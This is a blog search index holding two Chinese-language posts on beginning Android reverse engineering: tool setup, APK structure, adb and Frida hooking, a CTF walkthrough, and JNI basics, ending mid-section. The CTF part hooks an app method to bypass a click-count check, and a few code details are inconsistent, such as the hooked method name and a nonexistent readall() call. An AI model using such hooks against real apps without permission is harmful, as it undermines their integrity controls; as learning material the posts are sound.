<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android-1</title>
    <url>/2023/10/08/Android-1/</url>
    <content><![CDATA[<blockquote>
<p>不该点开那一篇推文。</p>
</blockquote>
<span id="more"></span>

<p>腾讯玄武实验室一篇关于ARM 的文章：<a href="https://8ksec.io/arm64-reversing-and-exploitation-part-7-bypassing-aslr-and-nx/">ARM64 Reversing And Exploitation Part 7 – Bypassing ASLR and NX - 8kSec</a></p>
<p>看了这篇文章，突然想学一学安卓安全相关的内容</p>
<h2 id="Android-环境搭建"><a href="#Android-环境搭建" class="headerlink" title="Android 环境搭建"></a>Android 环境搭建</h2><h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><p>在windows 和 Linux 下搭建。比较简单的方式：使用Android Studio</p>
<ol>
<li>下载 Java，配置环境变量。</li>
</ol>
<p>Linux 使用包管理器进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure>

<p>windows 下在oracle下载 <a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a>，然后配置</p>
<ol start="2">
<li>下载android studio，使用<a href="https://www.jetbrains.com/zh-cn/lp/toolbox/">JetBrains Toolbox</a></li>
<li>下载 Android SDK，Android studio 打开后如果没有sdk会自行下载，但是有墙，不一定会下载成功，但是总有解决问题的方法（</li>
<li>path: 下载sdk后，将 <code>xxx\platform-tools</code> 加入环境变量，就可以使用adb。翻翻下载的目录，可能有其余有趣的工具，比如qemu</li>
</ol>
<h3 id="运行apk"><a href="#运行apk" class="headerlink" title="运行apk"></a>运行apk</h3><ol>
<li>模拟器</li>
</ol>
<p>安装 WSL2 后导致大部分模拟器不能使用，<del>可以安装WSA</del>(WSA在2024年3月宣布停止支持)，但是万一存在 恶意软件 就会很难搞</p>
<p><a href="https://www.bluestacks.cn/">BlueStacks安卓模拟器</a>，配置后，以<strong>管理员运行</strong>，不会失败</p>
<ul>
<li>root：我在修改了配置文件后就成功了。<a href="https://appuals.com/root-bluestacks/">How to Root Bluestacks on Windows Easily?</a></li>
</ul>
<p>但是现在存在对应的选项，只需要在设置里面勾选一下就行。</p>
<ol>
<li>root 真机，这个才是最好的方法。<del>但是买不起</del></li>
</ol>
<ul>
<li>推荐，因为有的不给出x86的lib库</li>
<li>可以在平台买个二手的手机（x鱼，pixel</li>
</ul>
<h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><ul>
<li><a href="https://github.com/skylot/jadx">jadx</a></li>
<li><a href="https://www.pnfsoftware.com/jeb/">JEB Decompiler</a></li>
<li><a href="https://hex-rays.com/IDA-pro/">IDA Pro</a></li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">ghidra</a></li>
</ul>
<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><ul>
<li><a href="https://pypi.org/project/frida-tools/">frida-tools</a></li>
<li><a href="https://github.com/frida/frida/releases">firda server</a></li>
<li>xpose</li>
</ul>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><h2 id="APK结构"><a href="#APK结构" class="headerlink" title="APK结构"></a>APK结构</h2><ul>
<li>APK, 本质上是一个zip文件，我们可以修改文件后缀然后解压。</li>
</ul>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>用于存放需要打包到APK中的静态文件</p>
<p>assets目录<strong>支持任意深度的子目录</strong>，用户可以根据自己的需求任意部署文件夹架构。</p>
<h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><p>存放的是签名信息，用来保证apk包的完整性和系统的安全。</p>
<p>在编译生成一个apk包时，会对所有要打包的文件做一个校验计算，并把计算结果放在META-INF目录下。在安装时，如果校验结果与META-INF下的内容不一致，系统就不会安装这个apk。从而保证了apk包里的文件不能被随意替换。</p>
<p>META-INF目录下包含的文件有CERT.RSA，CERT.DSA，CERT.SF和MANIFEST.MF</p>
<ul>
<li>CERT.RSA：是开发者利用私钥对APK进行签名的签名文件</li>
<li>CERT.SF，MANIFEST.MF：记录了文件中文件的哈希值</li>
</ul>
<h3 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h3><p>这里存放应用程序依赖的<strong>native库文件</strong>，一般是用C&#x2F;C++编写，这里的lib库可能包含多种不同类型，大体可以分为ARM，X86等架构。</p>
<h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><p>res是resource的缩写，这个目录存放资源文件，存在这个文件夹下的所有文件都会映射到Android工程的<code>.R</code>文件中，生成对应的ID，访问的时候直接使用资源ID即R.id.filename，res文件夹下可以包含多个文件夹。</p>
<p><strong>res文件夹，存放的也是资源文件，与assets文件夹不同的是，这里是编译后的资源文件。</strong></p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>是Android应用程序的配置文件，是一个用来描述Android应用“整体资讯”的设定文件， Android系统可以根据这个<strong>自我介绍</strong>完整地了解APK应用程序的资讯，每个Android应用程序都必须包含一个AndroidManifest.xml文件，且它的名字是固定的，不能修改。我们在开发Android应用程序的时候，一般都把代码中的每一个Activity，Service，Provider和Receiver在AndroidManifest.xml中注册，只有这样系统才能启动对应的组件，另外这个文件还包含一些权限声明以及使用的SDK版本信息等等。程序打包时，会把AndroidManifest.xml进行简单的编译，便于Android系统识别，编译之后的格式是AXML格式</p>
<h3 id="classes-dex"><a href="#classes-dex" class="headerlink" title="classes.dex"></a>classes.dex</h3><p>传统的Java程序，首先先把Java文件编译成class文件，字节码都保存在了class文件中，Java虚拟机可以通过解释执行这些class文件。</p>
<p>而Dalvik虚拟机是在Java虚拟机进行了优化，执行的是Dalvik字节码，而这些Dalvik字节码是由Java字节码转换而来，一般情况下，Android应用在打包时通过AndroidSDK中的dx工具将Java字节码转换为Dalvik字节码。dx工具可以对多个class文件进行合并，重组，优化，可以达到减小体积，缩短运行时间的目的。</p>
<p>dx工具把每个.class文件的每个区域的内容进行去重，重组，优化重排后生成dex文件，生成的dex文件可以在Dalvik虚拟机执行，且速度比较快</p>
<h3 id="resources-arsc"><a href="#resources-arsc" class="headerlink" title="resources.arsc"></a>resources.arsc</h3><p>用来记录资源文件和资源ID之间的映射关系，用来根据资源ID寻找资源。Android的开发是分模块的，res目录专门用来存放资源文件，当在代码中需要调用资源文件时，只需要调用findviewbyId()就可以得到资源文件，每当在res文件夹下放一个文件，aapt就会自动生成对应的ID保存在.R文件，我们调用这个ID就可以，但是只有这个ID还不够，.R文件只是保证编译程序不报错，实际上在程序运行时，系统要根据ID去寻找对应的资源路径，而resources.arsc文件就是用来记录这些ID和资源文件位置对应关系的文件。</p>
<h3 id="kotlin"><a href="#kotlin" class="headerlink" title="kotlin"></a>kotlin</h3><p>kotlin 是一门编程语言，也可以直接运行在Java虚拟机中，这个目录存放kotlin资源</p>
<h2 id="adb-简单使用"><a href="#adb-简单使用" class="headerlink" title="adb 简单使用"></a>adb 简单使用</h2><ul>
<li>将文件放入android机器里</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push xxx /data/local/tmp</span><br></pre></td></tr></table></figure>

<ul>
<li>安装应用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb install apk.apk</span><br></pre></td></tr></table></figure>

<ul>
<li>卸载</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb uninstall com.xxx.xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>获得shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb connect &lt;ip&gt;:&lt;port&gt;</span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">adb disconnect &lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动指定的activity</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">am start -n &lt;package&gt;/&lt;activity&gt; </span><br></pre></td></tr></table></figure>

<h2 id="frida-简单使用"><a href="#frida-简单使用" class="headerlink" title="frida 简单使用"></a>frida 简单使用</h2><ul>
<li><p>python 的 frida-tools 和 手机端的 server 必须保持一致的版本, 可以使用python venv</p>
</li>
<li><p>CPU 信息</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<ul>
<li>指向hook 脚本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida -U -l hook.js -f com.package.name --no-pause</span><br></pre></td></tr></table></figure>

<ul>
<li>使用python 执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># frida-ps -Ua 获得一个pid号</span></span><br><span class="line">process = device.attach(<span class="number">8189</span>)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;hook.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send js</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    jscode = f.readall()</span><br><span class="line">    hook = process.create_script(jscode)</span><br><span class="line">hook.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()  <span class="comment"># 可以操作Android软件并且进行hook</span></span><br></pre></td></tr></table></figure>

<h3 id="hook-java"><a href="#hook-java" class="headerlink" title="hook java"></a>hook java</h3><p>框架</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Java.perform(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>获得类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">stringClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.util.String&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个实例</span></span><br><span class="line">stringClass.$<span class="keyword">new</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们也可以查找一个实例</span></span><br><span class="line">Java.choose(<span class="string">&#x27;java.lang.String&#x27;</span>, &#123;  </span><br><span class="line">        onMatch: function(instance)&#123;  </span><br><span class="line">	        console.log(<span class="string">&#x27;String instance is:&#x27;</span>, instance);  </span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: function()&#123;</span><br><span class="line">	        console.log(<span class="string">&#x27;search complete!&#x27;</span>);</span><br><span class="line">	    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态方法</span></span><br><span class="line">className.&lt;method&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例方法</span></span><br><span class="line"><span class="comment">// 1. 查找实例调用</span></span><br><span class="line"><span class="comment">// 2. new一个然后调用</span></span><br></pre></td></tr></table></figure>

<p>变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">&lt;class&gt;.&lt;<span class="keyword">var</span>&gt;.value = xxx;</span><br></pre></td></tr></table></figure>

<p>hook java method</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;class&gt;.&lt;method&gt;.implementation = function(arg...) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载: 当一个 class 两个名称相同的方法</span></span><br><span class="line">&lt;class&gt;.&lt;method&gt;.overload([TYPE], [TYPE]).implementation = function(args...)&#123; </span><br><span class="line">	<span class="comment">// do sth </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数的 hook $init</span></span><br><span class="line">StringBuilder.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = function (arg) &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">partial</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.$init(arg);</span><br><span class="line">    <span class="keyword">if</span> (arg !== <span class="literal">null</span>) &#123;</span><br><span class="line">         partial = arg.toString().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).slice(<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(&#x27;new StringBuilder(java.lang.String); =&gt; &#x27; + result)</span></span><br><span class="line">    console.log(<span class="string">&#x27;new StringBuilder(&quot;&#x27;</span> + partial + <span class="string">&#x27;&quot;);&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="入门例子"><a href="#入门例子" class="headerlink" title="入门例子"></a>入门例子</h2><h3 id="newstartCTF-2023-lazyactivity"><a href="#newstartCTF-2023-lazyactivity" class="headerlink" title="newstartCTF 2023 lazyactivity"></a>newstartCTF 2023 lazyactivity</h3><p>两个activity</p>
<ul>
<li>MainActivity</li>
<li>FlagActivity</li>
</ul>
<p>模拟器打开时是MainActivity，但是我们需要运行FlagActivity</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivit</span><br></pre></td></tr></table></figure>

<p>FlagActivity 逻辑：点击10000次，但是我们可以hook <code>access$004</code> 使其返回结果大于10000就行(原来的逻辑为点击一次，cnt+&#x3D;1, hook后就是点击一次，返回10001)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="type">int</span> access$<span class="number">004</span>(FlagActivity flagActivity) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> flagActivity.cnt + <span class="number">1</span>;</span><br><span class="line">        flagActivity.cnt = i;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(C0535R.layout.layout_2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(C0535R.C0538id.textView2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(C0535R.C0538id.editTextTextPersonName2);</span><br><span class="line">        ((Button) findViewById(C0535R.C0538id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.droidlearn.activity_travel.FlagActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>是男人就点击10000次（bushi</del></p>
<p>hook.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">3157</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载hooook.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lazy_activity.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>

<p>hook.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="comment">//定位类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">    <span class="comment">//在这里更改类的方法的实现（implementation）</span></span><br><span class="line">    my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="comment">//打印替换前的参数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>运行python脚本，然后在模拟器或者真机上点击一下就行。</p>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-2</title>
    <url>/2023/10/18/Android-2/</url>
    <content><![CDATA[<blockquote>
<p>安卓新人😋</p>
</blockquote>
<span id="more"></span>

<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><ol>
<li>Android Studio 创建一个项目，等待gradle</li>
<li>想要run起来，创建一个device。在Android Studio顶栏，device manager -&gt; create.</li>
</ol>
<ul>
<li>什么都先选第一个，缺什么东西使用IDE下载</li>
</ul>
<h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>Activity代表了一个具有用户界面的单一屏幕</p>
<p>Android 初始化是通过 Activity 中的 onCreate() 回调的调用开始的。存在有一序列的回调方法来启动一个活动，同时有一序列的方法来关闭活动</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>onCreate()</td>
<td>这是第一个回调，在活动第一次创建时调用</td>
</tr>
<tr>
<td>onStart()</td>
<td>这个回调在活动为用户可见时被调用</td>
</tr>
<tr>
<td>onResume()</td>
<td>这个回调在应用程序与用户开始可交互的时候调用</td>
</tr>
<tr>
<td>onPause()</td>
<td>被暂停的活动无法接受用户输入，不能执行任何代码。当前活动将要被暂停，上一个活动将要被恢复时调用</td>
</tr>
<tr>
<td>onStop()</td>
<td>当活动不在可见时调用</td>
</tr>
<tr>
<td>onDestroy()</td>
<td>当活动被系统销毁之前调用</td>
</tr>
<tr>
<td>onRestart()</td>
<td>当活动被停止以后重新打开时调用</td>
</tr>
</tbody></table>
<h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>Bundle主要用于<strong>传递数据</strong>：它保存的数据，是以key-value(键值对)的形式存在的。</p>
<p>我们经常使用<em>Bundle在Activity之间传递数据</em>，传递的数据可以是boolean、byte、int、long、float、double、string等基本类型或它们对应的数组，也可以是对象或对象数组。当Bundle传递的是对象或对象数组时，实现Serializable 或 Parcelable 接口。</p>
<h3 id="常见组件"><a href="#常见组件" class="headerlink" title="常见组件"></a>常见组件</h3><ol>
<li>onclick：点击事件</li>
<li>button：按钮</li>
<li>EditText：<br>编辑文本控件<br>编辑框（EditText）是TextView 的子类，在TextView 的基础上增加了文本编辑功能，用于处理用户输入，例如登录框等，是非常常用的组件。</li>
</ol>
<h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>android 创建一个空项目，打开hello xxx。先不在意细节，直接编译，可以直接运行（创建一个模拟器）</p>
<p>打包成APK文件：</p>
<ol>
<li>Build -&gt; Build Bundles&#x2F;Apks -&gt; Build APKs</li>
<li>Build -&gt; Make Project 然后在执行1</li>
<li>路径 app&#x2F;build&#x2F;outputs&#x2F;apk</li>
</ol>
<p>如果是debug版本，需要更改 build variants 为 release</p>
<p>然后就可以在jadx中反编译看看。</p>
<h2 id="Native"><a href="#Native" class="headerlink" title="Native"></a>Native</h2><ol>
<li>Android Studio选择创建一个native C++ 项目，等待gradle</li>
<li>出现一个 <code>cpp</code> 的文件夹，这就是我们需要写的库。同时存在java文件夹</li>
</ol>
<ul>
<li>device创建或者使用已经存在的</li>
</ul>
<ol start="3">
<li>Java层导入库</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123; System.loadLibrary(<span class="string">&quot;xxx&quot;</span>); &#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>在Java代码中出现如下的方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demo</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<h3 id="jni-h"><a href="#jni-h" class="headerlink" title="jni.h"></a>jni.h</h3><blockquote>
<p>在android ndk 下可以找到，直接采使用 find 命令找。</p>
</blockquote>
<ol>
<li>某些类型</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>*           jobject;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jclass;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jstring;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jarray;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>JNIEnv 和 JavaVM声明，在C和C++ 用法不太相同。</li>
</ol>
<p>JNI 定义了两个关键数据结构，即<code>JavaVM</code>和<code>JNIEnv</code>。两者本质上都是指向函数表的二级指针。（在 C++ 版本中，它们是一些类，这些类具有指向函数表的指针，并具有每个通过该函数表间接调用的 JNI 函数的成员函数。）JavaVM 提供<code>调用接口</code>函数，您可以利用此类来函数创建和销毁 JavaVM。理论上，每个进程可以有多个 JavaVM，但 Android 只允许有一个。</p>
<p>JNIEnv 提供了大部分 JNI 函数。原生函数都会收到 JNIEnv 作为第一个参数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JNIEnv</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* C_JNIEnv;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> _JavaVM JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>JavaVM 原型</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* functions;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    <span class="function">jint <span class="title">DestroyJavaVM</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DestroyJavaVM</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThread</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">DetachCurrentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DetachCurrentThread</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="type">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">GetEnv</span>(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThreadAsDaemon</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThreadAsDaemon</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span> &#123;</span><br><span class="line">    <span class="type">void</span>*       reserved0;</span><br><span class="line">    <span class="type">void</span>*       reserved1;</span><br><span class="line">    <span class="type">void</span>*       reserved2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">jint</span>        (*DestroyJavaVM)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThread)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">    <span class="built_in">jint</span>        (*DetachCurrentThread)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*GetEnv)(JavaVM*, <span class="type">void</span>**, jint);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>JNIEnv</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span> &#123;</span><br><span class="line">   <span class="comment">// xxx 比较多</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>native method，签名有个具体的表</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;</span><br><span class="line">    <span class="type">void</span>*       fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure>

<h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><ol>
<li>静态注册的函数名一般为 <code>Java_包名_类名_函数名</code> 将包名中的 <code>.</code> 替换为 <code>_</code> 就是native层函数的名称</li>
<li>函数：从<code>jni.h</code> 可以看出，第一个是JNIEnv，第二个为jclass，然后就是Java层代码的参数</li>
<li>android studio 创建一个native C++ 默认为静态注册</li>
</ol>
<p>native-lib.cpp</p>
